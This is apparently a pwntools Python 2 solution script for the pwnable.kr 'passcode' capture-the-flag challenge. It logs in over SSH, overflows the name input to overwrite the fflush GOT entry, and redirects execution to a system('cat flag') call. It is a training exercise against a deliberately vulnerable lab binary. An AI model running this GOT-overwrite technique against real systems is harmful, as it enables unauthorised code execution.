from pwn import *

context.log_level = "DEBUG"

s = ssh(host='pwnable.kr', port=2222, user='passcode', password='guest')
p = s.process("./passcode")
#p = process("./passcode")

print p.recvuntil('enter you name : ')

tar = "0x080485e3" # system('cat flag.txt')
hex_ret = p32(0x804a004) # fflush GOT entry

name = "A"*96 #+ "B"*4
name += hex_ret

#print repr(name)
p.sendline(name)

print p.recvuntil('enter passcode1 : ')
p.sendline(str(int(tar, 16)))

print p.recvall()
